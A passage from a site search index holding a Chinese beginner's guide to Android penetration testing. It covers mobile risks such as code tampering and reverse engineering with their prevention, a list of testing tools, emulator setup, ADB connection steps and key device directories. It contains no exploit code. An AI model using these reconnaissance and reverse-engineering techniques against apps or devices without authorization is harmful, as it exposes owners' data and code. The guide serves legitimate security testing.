80fd\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u4e0d\u5b89\u5168\u6388\u6743\u7684\u5f71\u54cd\u53ef\u80fd\u5bfc\u81f4\u58f0\u8a89\u53d7\u635f\u3001\u6b3a\u8bc8\u6216\u4fe1\u606f\u76d7\u7a83\u3002</p> <p>\u9884\u9632\uff1a\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u653b\u51fb\uff0c\u5fc5\u987b\u4ec5\u4f7f\u7528\u540e\u7aef\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u4fe1\u606f\u6765\u9a8c\u8bc1\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u7684\u89d2\u8272\u548c\u6743\u9650\u3002\u540e\u7aef\u4ee3\u7801\u8fd8\u5e94\u8be5\u9a8c\u8bc1\u8eab\u4efd\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#7","title":"7. \u4ee3\u7801\u8d28\u91cf\u5dee","text":"<p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u4e0d\u53d7\u4fe1\u4efb\u7684\u8f93\u5165\u4f20\u9012\u7ed9\u5728\u79fb\u52a8\u4ee3\u7801\u4e2d\u8fdb\u884c\u7684\u65b9\u6cd5\u8c03\u7528\u3002\u4ee3\u7801\u8d28\u91cf\u5dee\u7684\u95ee\u9898\u901a\u5e38\u901a\u8fc7\u6076\u610f\u8f6f\u4ef6\u6216\u7f51\u7edc\u9493\u9c7c\u8bc8\u9a97\u52a0\u4ee5\u5229\u7528\u3002\u5178\u578b\u7684\u653b\u51fb\u7c7b\u578b\u5c06\u5229\u7528\u5185\u5b58\u6cc4\u6f0f\u548c\u7f13\u51b2\u533a\u6ea2\u51fa\u3002</p> <p>\u6f0f\u6d1e\u7684\u5f71\u54cd\uff1a\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u4f4e\u52a3\u4ee3\u7801\u8d28\u91cf\u95ee\u9898\u53ef\u80fd\u5bfc\u81f4\u4fe1\u606f\u88ab\u76d7\u3001\u58f0\u8a89\u53d7\u635f\u3001\u77e5\u8bc6\u4ea7\u6743\u88ab\u76d7\u3002</p> <p>\u9884\u9632\uff1a\u9632\u6b62\u4ee3\u7801\u8d28\u91cf\u95ee\u9898\uff1a</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4fdd\u6301\u7ec4\u7ec7\u4e2d\u6bcf\u4e2a\u4eba\u90fd\u540c\u610f\u7684\u4e00\u81f4\u7684\u7f16\u7801\u6a21\u5f0f\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u7f16\u5199\u6613\u4e8e\u9605\u8bfb\u4e14\u6587\u6863\u9f50\u5168\u7684\u4ee3\u7801\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u59cb\u7ec8\u9a8c\u8bc1\u4efb\u4f55\u4f20\u5165\u7f13\u51b2\u533a\u6570\u636e\u7684\u957f\u5ea6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u4f7f\u7528\u7b2c\u4e09\u65b9\u9759\u6001\u5206\u6790\u5de5\u5177\u8bc6\u522b\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u5185\u5b58\u6cc4\u6f0f\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#8","title":"8.\u4ee3\u7801\u7be1\u6539","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u73b0\u6709\u5e94\u7528\u7684\u6e90\u4ee3\u7801\u5e76\u5c06\u5176\u6258\u7ba1\u5728\u7b2c\u4e09\u65b9\u5e94\u7528\u5546\u5e97\u4e2d\u6765\u521b\u5efa\u6076\u610f\u5e94\u7528\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7f51\u7edc\u9493\u9c7c\u6280\u672f\u5c06\u8fd9\u4e9b\u4fee\u6539\u540e\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u7ed9\u53d7\u5bb3\u8005\u3002</p> <p>\u6f0f\u6d1e\u7684\u5f71\u54cd\uff1a\u4ee3\u7801\u7be1\u6539\u53ef\u80fd\u5bfc\u81f4\u672a\u7ecf\u6388\u6743\u7684\u65b0\u529f\u80fd\u3001\u8eab\u4efd\u76d7\u7528\u3001\u6b3a\u8bc8\u3001\u76d7\u7248\u5bfc\u81f4\u7684\u6536\u5165\u635f\u5931\u548c\u58f0\u8a89\u53d7\u635f\u3002</p> <p>\u9884\u9632\uff1a\u4e3a\u9632\u6b62\u6b64\u7c7b\u653b\u51fb\uff0c\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u5fc5\u987b\u80fd\u591f\u5728\u8fd0\u884c\u65f6\u68c0\u6d4b\u5230\u4ee3\u7801\u5df2\u88ab\u6dfb\u52a0\u6216\u66f4\u6539\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u6b64\u7c7b\u5e94\u7528\u7a0b\u5e8f\u5c06\u5728\u8d8a\u72f1\u6216 root \u73af\u5883\u4e2d\u6267\u884c\uff0c\u7528\u6237\u53ef\u4ee5\u68c0\u67e5\u8bbe\u5907\u662f\u5426\u5df2 root \u6216\u8d8a\u72f1\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#9","title":"9.\u9006\u5411\u5de5\u7a0b","text":"<p>\u653b\u51fb\u8005\u5c06\u4ece\u5e94\u7528\u5546\u5e97\u4e0b\u8f7d\u4e00\u4e2a\u5e94\u7528\uff0c\u4ee5\u4f7f\u7528\u53ef\u7528\u5de5\u5177\u6267\u884c\u9006\u5411\u5de5\u7a0b\u548c\u9759\u6001\u5206\u6790\u6280\u672f\u3002\u8fd9\u4f7f\u4ed6\u4eec\u80fd\u591f\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u529f\u80fd\u3001\u66f4\u6539\u4ee3\u7801\u5e76\u91cd\u65b0\u7f16\u8bd1\u5b83\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u653b\u51fb\u8005\u968f\u540e\u53ef\u4ee5\u6cc4\u9732\u6709\u5173\u540e\u7aef\u670d\u52a1\u5668\u7684\u4fe1\u606f\u5e76\u8fdb\u884c\u653b\u51fb\uff0c\u6cc4\u9732\u5bc6\u7801\u5e38\u6570\u548c\u5bc6\u7801\uff0c\u7a83\u53d6\u77e5\u8bc6\u4ea7\u6743\u3002\u8fd9\u53ef\u80fd\u5bfc\u81f4\u516c\u53f8\u58f0\u8a89\u53d7\u635f\u548c\u5ba2\u6237\u8eab\u4efd\u76d7\u7a83\u3002\u00a0</p> <p>\u9884\u9632\uff1a\u4ee3\u7801\u6df7\u6dc6\u662f\u51cf\u5c11\u9006\u5411\u5de5\u7a0b\u6f0f\u6d1e\u7684\u5173\u952e\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#10","title":"10. \u65e0\u5173\u529f\u80fd","text":"<p>\u653b\u51fb\u8005\u5c06\u5c1d\u8bd5\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u4ee5\u53d1\u73b0\u540e\u7aef\u7cfb\u7edf\u7684\u529f\u80fd\u3002\u7136\u540e\uff0c\u4ed6\u4eec\u5c1d\u8bd5\u76f4\u63a5\u5229\u7528\u540e\u7aef\u7cfb\u7edf\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\uff1a\u6b64\u7c7b\u653b\u51fb\u7684\u6280\u672f\u5f71\u54cd\u5305\u62ec\u66b4\u9732\u540e\u7aef\u7cfb\u7edf\u529f\u80fd\uff0c\u6267\u884c\u672a\u7ecf\u6388\u6743\u7684\u9ad8\u6743\u9650\u64cd\u4f5c\uff0c\u4ee5\u53ca\u58f0\u8a89\u53d7\u635f\u548c\u77e5\u8bc6\u4ea7\u6743\u76d7\u7a83\u3002</p> <p>\u9884\u9632\uff1a\u5e94\u624b\u52a8\u6267\u884c\u6e90\u4ee3\u7801\u5ba1\u67e5\uff0c\u4ee5\u9632\u6b62\u6b64\u7c7b\u6f0f\u6d1e\u3002</p> <p>\u63a8\u8350\u7684\u5b89\u5353\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177</p> <p>\u4ee5\u4e0b\u662f\u53ef\u7528\u4e8e\u6267\u884c Android \u5e94\u7528\u7a0b\u5e8f\u6e17\u900f\u6d4b\u8bd5\u7684\u5de5\u5177\u5217\u8868\u3002\u6709\u4e9b\u7528\u4e8e\u81ea\u52a8\u5316\u6d4b\u8bd5\uff0c\u6709\u4e9b\u7528\u4e8e\u624b\u52a8\u6d4b\u8bd5\u3002</p> <p>\u81ea\u52a8\u5316\u7684 Android \u6e17\u900f\u6d4b\u8bd5\u5de5\u5177\u975e\u5e38\u9002\u5408\u626b\u63cf\u5e38\u89c1\u6f0f\u6d1e\u3002\u4e0e\u624b\u52a8\u5de5\u5177\u548c\u6d41\u7a0b\u76f8\u6bd4\uff0c\u5b83\u4eec\u63d0\u4f9b\u4e86\u66f4\u5feb\u3001\u66f4\u4fbf\u5b9c\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u901a\u8fc7\u5c06\u4eba\u7c7b\u667a\u80fd\u4e0e\u81ea\u52a8\u5316\u5de5\u5177\u76f8\u7ed3\u5408\uff0c\u63d0\u4f9b\u66f4\u6df1\u5165\u548c\u66f4\u8106\u5f31\u7684\u6d1e\u5bdf\uff1a</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Android Debug Bridge (ADB)\uff1a\u4e00\u79cd\u591a\u529f\u80fd\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u8ba9\u60a8\u4e0e\u8bbe\u5907\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Dex2jar\uff1a\u5c06 .dex \u6587\u4ef6\u8f6c\u6362\u4e3a .class \u6587\u4ef6\uff0c\u538b\u7f29\u4e3a jar \u6587\u4ef6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 JD-GUI\uff1a\u4e00\u4e2a\u72ec\u7acb\u7684\u56fe\u5f62\u5b9e\u7528\u7a0b\u5e8f\uff0c\u663e\u793a\u6765\u81ea CLASS \u6587\u4ef6\u7684 Java \u6e90\u4ee3\u7801\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 JADX\uff1a\u7528\u4e8e\u4ece Android Dex \u548c APK \u6587\u4ef6\u751f\u6210 Java \u6e90\u4ee3\u7801\u7684\u547d\u4ee4\u884c\u548c GUI \u5de5\u5177\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 APKTOOL\u00a0: \u7528\u4e8e\u9006\u5411\u5de5\u7a0b\u7b2c\u4e09\u65b9\u3001\u5c01\u95ed\u3001\u4e8c\u8fdb\u5236 Android \u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u5177\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Burp Suite\uff1a\u4e00\u7ec4\u7528\u4e8e Web \u5e94\u7528\u7a0b\u5e8f\u6e17\u900f\u6d4b\u8bd5\u7684\u5de5\u5177\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Frida\uff1a\u9762\u5411\u5f00\u53d1\u4eba\u5458\u3001\u9006\u5411\u5de5\u7a0b\u5e08\u548c\u5b89\u5168\u7814\u7a76\u4eba\u5458\u7684\u52a8\u6001\u68c0\u6d4b\u5de5\u5177\u5305\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u5f02\u8bae\uff1a\u7531 Frida \u63d0\u4f9b\u652f\u6301\u7684\u8fd0\u884c\u65f6\u79fb\u52a8\u63a2\u7d22\u5de5\u5177\u5305\uff0c\u65e8\u5728\u5e2e\u52a9\u60a8\u8bc4\u4f30\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u72b6\u51b5\uff0c\u800c\u65e0\u9700\u8d8a\u72f1\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Ghidra\uff1a\u7531 NSA \u7814\u7a76\u5c40\u5f00\u53d1\u7684\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b (SRE) \u5de5\u5177\u5957\u4ef6\uff0c\u7528\u4e8e\u652f\u6301\u7f51\u7edc\u5b89\u5168\u4efb\u52a1\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 Drozer\uff1adrozer\uff08\u539f Mercury\uff09\u662f\u9886\u5148\u7684 Android \u5b89\u5168\u6d4b\u8bd5\u6846\u67b6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 MobSF\uff1a\u79fb\u52a8\u5b89\u5168\u6846\u67b6 (MobSF) \u662f\u4e00\u79cd\u81ea\u52a8\u5316\u7684\u4e00\u4f53\u5316\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f (Android/iOS/Windows) \u7b14\u6d4b\u8bd5\u3001\u6076\u610f\u8f6f\u4ef6\u5206\u6790\u548c\u5b89\u5168\u8bc4\u4f30\u6846\u67b6\uff0c\u80fd\u591f\u6267\u884c\u9759\u6001\u548c\u52a8\u6001\u5206\u6790\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#android_1","title":"\u4e3a Android \u8bbe\u7f6e\u6e17\u900f\u6d4b\u8bd5\u73af\u5883","text":"<p>\u4e3a\u4e86\u5bf9 Android \u8bbe\u5907\u548c\u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u8bc4\u4f30\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u771f\u5b9e\u7684\u6216\u6a21\u62df\u7684 Android \u8bbe\u5907\u3002Android \u865a\u62df\u8bbe\u5907 (AVD) \u4e0e Android Studio IDE\uff08\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff09\u4e00\u8d77\u63d0\u4f9b\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002</p> <p>Genymotion\u548cCorellium\u4e5f\u662f\u4e0d\u9519\u7684\u9009\u62e9\uff0c\u56e0\u4e3a\u5b83\u4eec\u63d0\u4f9b\u4e86\u57fa\u4e8e\u4e91\u7684\u73af\u5883\u548c\u57fa\u4e8e ARM \u7684\u865a\u62df\u5316\uff08\u7528\u4e8e\u79fb\u52a8\u8bbe\u5907\u7684 CPU \u67b6\u6784\uff09\u3002\u5229\u7528\u57fa\u4e8e\u4e91\u7684\u73af\u5883\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Web \u6d4f\u89c8\u5668\u751f\u6210\u548c\u81ea\u5b9a\u4e49\u79fb\u52a8\u8bbe\u5907\uff0c\u800c Corellium \u63d0\u4f9b\u76f8\u5e94\u7684\u9009\u9879\u6765\u6839\u6216\u8d8a\u72f1 Android \u6216 iPhone \u8bbe\u5907\u3002</p> <p>ARM \u662f\u5f53\u4eca\u7528\u4e8e Android \u548c iPhone \u8bbe\u5907\u7684 CPU \u67b6\u6784\u3002\u5185\u6838\u5229\u7528\u4e0e CPU \u67b6\u6784\u6709\u5173\u3002\u5927\u591a\u6570\u6a21\u62df\u5668\u865a\u62df\u5316\u4e86\u975e ARM CPU \u67b6\u6784\uff0c\u8fd9\u4f7f\u5f97\u6e17\u900f\u6d4b\u8bd5\u8005\u65e0\u6cd5\u4f7f\u7528\u79fb\u52a8\u6a21\u62df\u5668\u6765\u7814\u7a76\u6f5c\u5728\u7684\u65b0\u5185\u6838\u5f00\u53d1\u6280\u672f\u3002\u5bf9\u6211\u4eec\u6765\u8bf4\u5e78\u8fd0\u7684\u662f\uff0cCorellium \u548c Genymotion \u901a\u8fc7\u57fa\u4e8e ARM \u7684\u865a\u62df\u5316\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u5728 Linux \u4e0a\u5b89\u88c5Android Studio\u975e\u5e38\u7b80\u5355\u3002\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u89e3\u538b\u7f29\u5e76\u8fd0\u884c\u76ee\u5f55\u4e2d\u7684studio.sh\u6587\u4ef6bin/\u3002\u8981\u5728 Windows \u6216 macOS \u4e0a\u5b89\u88c5 Android Studio\uff0c\u6211\u4eec\u9700\u8981\u6309\u7167\u5b89\u88c5\u5411\u5bfc\u8fdb\u884c\u64cd\u4f5c\u3002\u4e24\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8fc7\u7a0b\u51e0\u4e4e\u76f8\u540c\u3002</p> <p>\u4f8b\u5982\uff0c\u5728 Windows \u4e0a\uff0c\u6211\u4eec\u5355\u51fb\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7136\u540e\u6309\u7167\u8bbe\u7f6e\u5411\u5bfc\u7684\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\u3002\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u7b49\u5f85\u4e00\u4e9b\u7ec4\u4ef6\u4e0b\u8f7d\u5373\u53ef\u3002\u00a0</p> <p></p> <p>\u5b8c\u6210\u540e\uff0c\u5355\u51fb\u5b8c\u6210\uff0c\u7136\u540e\u5355\u51fb\u65b0\u5efa\u9879\u76ee\u3002</p> <p></p> <p>\u9009\u62e9 Empty Activity\uff0c\u7136\u540e\u5728\u4ee5\u4e0b\u7a97\u53e3\u4e2d\u5355\u51fb Next\u3002</p> <p></p> <p>\u6700\u540e\uff0c\u5355\u51fb\u5b8c\u6210\u4ee5\u5b8c\u6210\u8be5\u8fc7\u7a0b\u3002</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u9879\u76ee\uff0c\u6211\u4eec\u53ea\u9700\u8981\u7b49\u5f85\u66f4\u591a\u6587\u4ef6\u4ece IDE \u81ea\u52a8\u4e0b\u8f7d\u3002\u5b8c\u6210\u540e\uff0c\u5355\u51fb IDE \u7684\u9876\u90e8\u4e2d\u5fc3\uff08\u5982\u4e0b\u6240\u793a\uff09\u5e76\u9009\u62e9 AVD Manager\u3002</p> <p></p> <p>\u5728 AVD Manager \u83dc\u5355\u4e0a\uff0c\u5355\u51fb\u7eff\u8272\u7684 Play \u6309\u94ae\u542f\u52a8\u6a21\u62df\u5668\u3002</p> <p></p> <p>\u8bbe\u5907\u542f\u52a8\u540e\uff0c\u5e94\u5982\u4e0b\u6240\u793a\uff1a\u00a0</p> <p></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#android_2","title":"\u4e94\u79cd\u6709\u6548\u7684Android\u6e17\u900f\u6d4b\u8bd5\u6280\u672f","text":"<p>\u5728 Android \u8bbe\u5907\u4e2d\uff0c\u60a8\u9700\u8981\u8fdb\u884c\u8bb8\u591a\u6d4b\u8bd5\u4ee5\u53d1\u73b0\u5b89\u5168\u6f0f\u6d1e\u3002</p> <p>\u53cd\u8f6c APK\uff08Android \u5305\uff09\u6587\u4ef6\u7684\u4ee3\u7801\u3001\u62e6\u622a HTTP \u8bf7\u6c42\uff0c\u751a\u81f3\u679a\u4e3e\u5df2\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u7ed3\u6784\uff0c\u90fd\u53ef\u80fd\u5bfc\u81f4\u654f\u611f\u4fe1\u606f\u7684\u6f5c\u5728\u66b4\u9732\uff0c\u8fd9\u53ef\u80fd\u4f7f\u6211\u4eec\u80fd\u591f\u66f4\u6539\u7279\u5b9a\u529f\u80fd\u7684\u9884\u671f\u903b\u8f91\u6d41\u7a0b.\u00a0\u6211\u5c06\u5728\u4e0b\u9762\u7684\u90e8\u5206\u4e2d\u89e3\u91ca\u5982\u4f55\u68c0\u67e5 Android \u8bbe\u5907\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#1","title":"1.\u672c\u5730\u6570\u636e\u5b58\u50a8\u679a\u4e3e","text":"<p>\u4e3a\u4e86\u679a\u4e3e\u5df2\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u7ed3\u6784\uff0c\u6211\u4eec\u9700\u8981\u8bbf\u95ee\u771f\u5b9e\u6216\u6a21\u62df\u8bbe\u5907\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528Android \u8c03\u8bd5\u6865(ADB) \u6765\u5b9e\u73b0\uff0c\u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u8ba9\u60a8\u76f4\u63a5\u4e0e\u8bbe\u5907\u901a\u4fe1\u3002\u4f7f\u7528 ADB\uff0c\u6211\u4eec\u53ef\u4ee5\u5b89\u88c5\u548c\u8c03\u8bd5\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u5b83\u63d0\u4f9b\u7684 Unix shell \u53ef\u7528\u4e8e\u5728\u8bbe\u5907\u4e0a\u8fd0\u884c\u547d\u4ee4\u3002</p> <p>ADB \u53ef\u4ee5\u901a\u8fc7\u952e\u5165\u8f7b\u677e\u5b89\u88c5\u5728 Linux \u4e2dsudo apt install adb\u3002\u5b89\u88c5\u540e\uff0cadb \u5ba2\u6237\u7aef\u8fd8\u4f1a\u542f\u52a8\u4e00\u4e2a adb \u670d\u52a1\u5668\uff0c\u8be5\u670d\u52a1\u5668\u4f1a\u81ea\u52a8\u5efa\u7acb\u4e0e\u6240\u6709\u6b63\u5728\u8fd0\u884c\u7684\u8bbe\u5907\u7684\u8fde\u63a5\u3002\u5982\u679c\u8fd9\u4e0d\u8d77\u4f5c\u7528\uff0c\u6211\u4eec\u5fc5\u987b\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u624b\u52a8\u5efa\u7acb\u8fde\u63a5\uff1a\u00a0</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/APP/%E9%9D%A2%E5%90%91%E5%88%9D%E5%AD%A6%E8%80%85%E7%9A%84%E5%88%86%E6%AD%A5%20Android%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/#adb","title":"\u901a\u8fc7 ADB \u624b\u52a8\u8fde\u63a5","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u5728\u8bbe\u5907\u4e0a\u542f\u7528 USB \u8c03\u8bd5\u9009\u9879\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u70b9\u51fb\u8bbe\u7f6e\uff0c\u7136\u540e\u70b9\u51fb\u5173\u4e8e\u8bbe\u5907\u6216\u5173\u4e8e\u624b\u673a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u8bbe\u5907\uff0c\u7136\u540e\u6211\u4eec\u5411\u4e0b\u6eda\u52a8\u5e76\u70b9\u51fb\u5185\u90e8\u7248\u672c\u53f7\u4e03\u6b21\uff0c\u76f4\u5230\u51fa\u73b0\u201c\u60a8\u73b0\u5728\u662f\u5f00\u53d1\u4eba\u5458\uff01\u201d\u6d88\u606f\u3002\u5f39\u51fa\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u70b9\u51fb\u4e00\u6b21\u540e\u9000\u6309\u94ae\u5e76\u5bfc\u822a\u5230\u5f00\u53d1\u4eba\u5458\u9009\u9879\u3002</p> <p></p> <p>\u7136\u540e\u5411\u4e0b\u6eda\u52a8\u5230\u8c03\u8bd5\u90e8\u5206\uff0c\u76f4\u5230\u6211\u4eec\u627e\u5230\u5e76\u542f\u7528 USB \u8c03\u8bd5\u9009\u9879\u3002</p> <p></p> <p>\u73b0\u5728\u542f\u7528\u4e86 USB \u8c03\u8bd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Linux \u4e2d\u901a\u8fc7\u952e\u5165\u6765\u5b89\u88c5 ADB\u00a0sudo apt install adb\u3002\u56de\u5230\u6211\u4eec\u7684 Android \u8bbe\u5907\uff0c\u6211\u4eec\u70b9\u51fb\u8bbe\u7f6e\u56fe\u6807\uff0c\u7136\u540e\u5bfc\u822a\u5230 Wi-Fi\uff0c\u6700\u540e\u70b9\u51fb\u5c4f\u5e55\u53f3\u4e0a\u89d2\u7684\u9f7f\u8f6e\u56fe\u6807\u4ee5\u83b7\u5f97 IP \u5730\u5740\u3002</p> <p></p> <p>\u83b7\u5f97 IP \u540e\uff0c\u6211\u4eec\u8f93\u5165adb connect 192.168.232.2:5555.\u00a0\u6b64\u547d\u4ee4\u8fd8\u5c06\u5728\u672c\u5730\u542f\u52a8 adb \u670d\u52a1\u5668\uff0c\u7b49\u5f85\u65b0\u8fde\u63a5\u3002\u6839\u636e\u5b98\u65b9 ADB\u6587\u6863\uff0c\u7aef\u53e3 5555 \u7531 adb \u670d\u52a1\u5668\u4f7f\u7528\uff0c\u5b83\u662f\u6a21\u62df\u5668\u5c06\u5c1d\u8bd5\u8fde\u63a5\u7684\u5e8f\u5217\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7aef\u53e3\u3002\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u952e\u5165adb devices\u4ee5\u5217\u51fa\u8fde\u63a5\u7684\u8bbe\u5907\u3002</p> <p></p> <p>\u8fde\u63a5\u7684\u8bbe\u5907\u53ef\u80fd\u4ee5 \u6216 \u7684\u683c\u5f0fname-port\u663e\u793aip-port\u3002\u5728\u6211\u4eec\u7684\u4f8b\u5b50\u4e2d\uff0c\u8bbe\u5907\u663e\u793a\u4e3aemulator-5554\u3002</p> <p>\u91cd\u8981\u76ee\u5f55</p> <p>\u4e0b\u9762\u5217\u51fa\u7684\u76ee\u5f55\u662f Android \u8bbe\u5907\u4e2d\u6700\u91cd\u8981\u7684\u76ee\u5f55\uff0c\u503c\u5f97\u7559\u610f\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/data\uff1a\u5305\u542b\u7528\u6237\u5b89\u88c5\u7684\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/user/0\uff1a\u5305\u542b\u53ea\u6709\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u8bbf\u95ee\u7684\u6570\u636e\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/app\uff1a\u5305\u542b\u7528\u6237\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u7684 APK\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /system/app\uff1a\u5305\u542b\u8bbe\u5907\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /system/bin\uff1a\u5305\u542b\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/local/tmp\uff1a\u4e00\u4e2a\u4e16\u754c\u53ef\u5199\u7684\u76ee\u5f55\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 /data/system\uff1a\u5305\u542b\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u00b7\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 